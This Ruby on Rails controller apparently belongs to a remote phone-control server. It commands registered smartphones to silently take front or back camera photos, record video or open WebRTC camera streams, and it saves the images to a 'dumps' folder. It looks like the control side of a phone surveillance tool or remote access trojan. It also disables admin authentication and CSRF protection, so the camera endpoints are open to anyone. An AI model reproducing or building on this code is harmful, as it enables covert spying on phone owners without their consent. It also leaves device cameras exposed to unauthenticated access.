class CameraController < InheritedResources::Base
  skip_before_action :authenticate_admin_user!, raise: false
  skip_before_action :verify_authenticity_token
  include CommandSender

  def take_picture
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      camera = params[:back_camera] == "false" ? "1" : "0"

      pending_command = send_command_and_wait(@smartphone, 'take_photo', { camera_id: camera }, timeout: 30.seconds)

      if pending_command.completed?
        photo_data = pending_command.response_data
        if photo_data && photo_data['image_base64'].present?
          currentTimeFormat = DateTime.now.strftime("%Y-%m-%d_%H--%M--%S")
          file_name = "webcam_snap_#{currentTimeFormat}.jpeg"
          image_bytes = Base64.decode64(photo_data['image_base64'])
          file_path = Rails.root.join('files', 'dumps', 'pictures', file_name)
          FileUtils.mkdir_p(File.dirname(file_path))
          File.binwrite(file_path, image_bytes)

          Picture.create!(
            date: currentTimeFormat.gsub("_", " ").gsub("--", ":"),
            filename: file_name,
            smartphone_id: @smartphone.id
          )
          commandOutput = ["Photo captured: #{file_name} (#{image_bytes.size} bytes)"]
        else
          commandOutput = ["Operation Failed: No image data received"]
        end
      else
        commandOutput = ["Operation Failed: Device did not respond"]
      end
    rescue => e
      Rails.logger.error("Error taking picture: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js { render "take_picture", locals: { commandOutput: commandOutput } }
    end
  end

  def front_camera_snap
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])

      pending_command = send_command_and_wait(@smartphone, 'take_photo', { camera_id: "1" }, timeout: 30.seconds)

      if pending_command.completed?
        photo_data = pending_command.response_data
        if photo_data && photo_data['image_base64'].present?
          currentTimeFormat = DateTime.now.strftime("%Y-%m-%d_%H--%M--%S")
          file_name = "front_cam_#{currentTimeFormat}.jpeg"
          image_bytes = Base64.decode64(photo_data['image_base64'])
          file_path = Rails.root.join('files', 'dumps', 'pictures', file_name)
          FileUtils.mkdir_p(File.dirname(file_path))
          File.binwrite(file_path, image_bytes)

          Picture.create!(
            date: currentTimeFormat.gsub("_", " ").gsub("--", ":"),
            filename: file_name,
            smartphone_id: @smartphone.id
          )
          commandOutput = ["Front camera photo: #{file_name} (#{image_bytes.size} bytes)"]
        else
          commandOutput = ["Operation Failed: No image data received"]
        end
      else
        commandOutput = ["Operation Failed: Device did not respond"]
      end
    rescue => e
      Rails.logger.error("Error taking front camera snap: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end
    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js { render "front_camera_snap", locals: { commandOutput: commandOutput } }
    end
  end

  def webcam_record
    begin
      safe_id = params[:smartphone_id].to_s.gsub(/[^a-zA-Z0-9_-]/, '')
      @smartphone = Smartphone.find(safe_id)
      camera_id = params[:back_camera] == "true" ? "0" : "1"

      cache_key = "recording_#{@smartphone.id}"
      if !Rails.cache.read(cache_key)
        pending_command = send_command_async(@smartphone, 'start_camera', { camera_id: camera_id })
        Rails.cache.write(cache_key, true)
        commandOutput = ["Camera recording started (ID: #{camera_id})"]
      else
        pending_command = send_command_async(@smartphone, 'stop_camera', {})
        Rails.cache.delete(cache_key)
        commandOutput = ["Camera recording stopped"]
      end

    rescue => e
      Rails.logger.error("Error on webcam record: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end

    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js {
        render "webcam_record", locals: {
          commandOutput: commandOutput.map { |s| ActionController::Base.helpers.sanitize(s) },
          fileName: ActionController::Base.helpers.sanitize(@fileNameHtml.to_s)
        }
      }
    end
  end

  def start_webrtc_stream
    begin
      @smartphone = Smartphone.find(params[:smartphone_id])
      stream_type = params[:stream_type] || 'camera'

      pending_command = send_command_async(
        @smartphone,
        'start_webrtc_stream',
        { stream_type: stream_type }
      )

      commandOutput = ["🎥 WebRTC stream initiated (#{stream_type})"]
    rescue => e
      Rails.logger.error("Error starting WebRTC stream: #{e.message}")
      commandOutput = ["Operation Failed: #{e.message}"]
    end

    if want_json?
      render json: { output: commandOutput }
      return
    end
    respond_to do |format|
      format.js { render "start_webrtc_stream", locals: { commandOutput: commandOutput, smartphone: @smartphone } }
    end
  end

  private

  def want_json?
    request.format.json? || request.headers['Accept']&.include?('application/json')
  end
end
